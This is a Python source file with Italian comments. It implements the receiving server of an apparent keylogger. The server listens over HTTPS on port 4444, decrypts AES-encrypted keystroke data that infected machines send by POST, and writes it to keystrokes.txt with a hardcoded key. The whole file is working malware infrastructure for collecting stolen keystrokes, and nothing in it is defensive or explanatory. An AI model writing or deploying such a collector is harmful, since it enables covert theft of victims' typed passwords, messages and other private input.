import http.server
import ssl
import os
import datetime
from Crypto.Cipher import AES
import base64

# Configurazione dell'indirizzo e della porta
HOST = "192.168.1.106"
PORT = 4444

# Cartella per salvare i file ricevuti
SAVE_DIR = "received_data"
os.makedirs(SAVE_DIR, exist_ok=True)

# Crea un file unico per salvare i tasti
KEYSTROKES_FILE = os.path.join(SAVE_DIR, "keystrokes.txt")

# La chiave di cifratura AES (in esadecimale)
AES_KEY = bytes.fromhex("3a7d4f8e1b2c6d9a0f5e4c8a9b3d2e1f")  # 16 byte

# Funzione per decifrare i dati
def decrypt(ciphertext):
    try:
        # Decodifica i dati ricevuti in base64
        data = base64.b64decode(ciphertext.encode())
        
        # Estrai nonce, tag e ciphertext
        nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
        
        # Crea il cifratore AES in modalità EAX
        cipher = AES.new(AES_KEY, AES.MODE_EAX, nonce)
        
        # Decifra i dati e verifica il tag
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag).decode()
        return decrypted_data
    except Exception as e:
        print(f"Errore durante la decifratura: {e}")
        return None

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])  # Ottieni la lunghezza dei dati
        post_data = self.rfile.read(content_length).decode('utf-8')  # Leggi i dati ricevuti
        
        # Controlla se i dati ricevuti sono il messaggio 'inviocompletato'
        if post_data == "inviocompletato":
            print("Messaggio di completamento ricevuto.")
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Messaggio di completamento ricevuto e gestito correttamente.")
            return
        
        # Decifra i dati ricevuti
        decrypted_data = decrypt(post_data)
        
        if decrypted_data is not None:
            # Apri il file in modalità append e aggiungi il dato decifrato
            with open(KEYSTROKES_FILE, "a") as file:
                file.write(decrypted_data + "\n")
            
            print(f"Tasto decifrato ricevuto: {decrypted_data}")
            
            # Rispondi al client
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Tasto ricevuto e salvato con successo")
        else:
            # Se la decifratura fallisce, invia un errore
            self.send_response(400)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Errore nella decifratura dei dati")

# Configura il server HTTPS
server_address = (HOST, PORT)
httpd = http.server.HTTPServer(server_address, MyHandler)

# Abilita SSL
httpd.socket = ssl.wrap_socket(httpd.socket, 
                               keyfile="key.pem", 
                               certfile="cert.pem", 
                               server_side=True)

print(f"Server HTTPS in ascolto su https://{HOST}:{PORT}")
httpd.serve_forever()
